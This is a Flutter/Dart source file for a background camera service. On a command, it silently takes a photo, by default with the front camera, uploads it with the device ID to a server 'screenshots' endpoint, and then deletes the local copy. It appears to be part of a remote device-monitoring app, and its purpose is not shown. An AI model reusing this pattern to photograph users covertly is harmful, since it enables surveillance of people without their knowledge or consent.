// lib/services/background/camera_service.dart - FIXED
import 'dart:io';
import 'package:camera/camera.dart';
import 'package:dio/dio.dart';
import 'package:get/get.dart' hide FormData, MultipartFile;
import 'dart:developer' as developer;
import '../../core/constants/app_endpoints.dart';
import '../api/api_service.dart';
import '../local/local_storage_service.dart';

class CameraService {
  static const String _tag = 'CameraService';
  static List<CameraDescription>? _cameras;
  static CameraController? _controller;

  /// Initialize camera service
  static Future<void> initialize() async {
    try {
      developer.log('Initializing camera service...', name: _tag);
      _cameras = await availableCameras();
      developer.log('✅ ${_cameras?.length ?? 0} cameras found', name: _tag);
    } catch (e) {
      developer.log('❌ Failed to initialize cameras', name: _tag, error: e);
    }
  }

  /// Capture photo and send to server
  static Future<void> captureAndSend({bool useFrontCamera = true}) async {
    developer.log('========================================', name: _tag);
    developer.log('📸 CAPTURE PHOTO COMMAND', name: _tag);
    developer.log('Use front camera: $useFrontCamera', name: _tag);

    if (_cameras == null || _cameras!.isEmpty) {
      developer.log(
        '⚠️ Cameras not initialized, initializing now...',
        name: _tag,
      );
      await initialize();

      if (_cameras == null || _cameras!.isEmpty) {
        developer.log('❌ No cameras available', name: _tag);
        return;
      }
    }

    try {
      // Step 1: Select camera
      developer.log('Selecting camera...', name: _tag);
      final camera = _cameras!.firstWhere(
        (camera) =>
            camera.lensDirection ==
            (useFrontCamera
                ? CameraLensDirection.front
                : CameraLensDirection.back),
        orElse: () => _cameras!.first,
      );
      developer.log('✅ Camera selected: ${camera.name}', name: _tag);

      // Step 2: Initialize camera controller
      developer.log('Initializing camera controller...', name: _tag);
      _controller = CameraController(
        camera,
        ResolutionPreset.medium,
        enableAudio: false,
      );

      await _controller!.initialize();
      developer.log('✅ Camera controller initialized', name: _tag);

      // Step 3: Take picture
      developer.log('Taking picture...', name: _tag);
      final XFile image = await _controller!.takePicture();
      developer.log('✅ Picture taken: ${image.path}', name: _tag);

      // Step 4: Send to server
      await _sendToServer(image);

      // Step 5: Cleanup
      await _controller!.dispose();
      _controller = null;
      developer.log('✅ Camera controller disposed', name: _tag);
    } catch (e, stackTrace) {
      developer.log(
        '❌ Failed to capture and send photo',
        name: _tag,
        error: e,
        stackTrace: stackTrace,
        level: 1000,
      );

      // Cleanup on error
      if (_controller != null) {
        try {
          await _controller!.dispose();
          _controller = null;
        } catch (disposeError) {
          developer.log(
            'Error disposing controller',
            name: _tag,
            error: disposeError,
          );
        }
      }
    }

    developer.log('========================================', name: _tag);
  }

  /// Send captured image to server
  static Future<void> _sendToServer(XFile image) async {
    try {
      developer.log('Preparing to send image to server...', name: _tag);

      // Get device ID
      final deviceId = await LocalStorageService.getDeviceId();
      if (deviceId == null || deviceId.isEmpty) {
        developer.log('❌ No device ID found', name: _tag);
        return;
      }

      developer.log('Device ID: $deviceId', name: _tag);

      // Get API service
      final apiService = ApiService();
      await apiService.init();

      // Create form data
      developer.log('Creating form data...', name: _tag);
      FormData formData = FormData.fromMap({
        'device_id': deviceId,
        'screenshot': await MultipartFile.fromFile(
          image.path,
          filename: 'capture_${DateTime.now().millisecondsSinceEpoch}.jpg',
        ),
      });

      developer.log(
        'Sending POST to ${ApiEndpoints.sendScreenshot}',
        name: _tag,
      );

      // Send to server using correct endpoint
      final response = await apiService.dio.post(
        ApiEndpoints.sendScreenshot, // ✅ FIXED: Use /device/screenshots
        data: formData,
      );

      developer.log('Response status: ${response.statusCode}', name: _tag);
      developer.log('Response data: ${response.data}', name: _tag);

      if (response.statusCode == 200 || response.statusCode == 201) {
        developer.log('✅ Image uploaded successfully', name: _tag);

        // Delete local file after successful upload
        try {
          File(image.path).deleteSync();
          developer.log('✅ Local file deleted', name: _tag);
        } catch (deleteError) {
          developer.log(
            '⚠️ Failed to delete local file',
            name: _tag,
            error: deleteError,
          );
        }
      } else {
        developer.log(
          '⚠️ Upload failed with status: ${response.statusCode}',
          name: _tag,
        );
      }
    } catch (e, stackTrace) {
      developer.log(
        '❌ Failed to send image to server',
        name: _tag,
        error: e,
        stackTrace: stackTrace,
        level: 1000,
      );
    }
  }

  /// Check if camera is available
  static bool get hasCameras => _cameras != null && _cameras!.isNotEmpty;

  /// Get number of available cameras
  static int get cameraCount => _cameras?.length ?? 0;
}
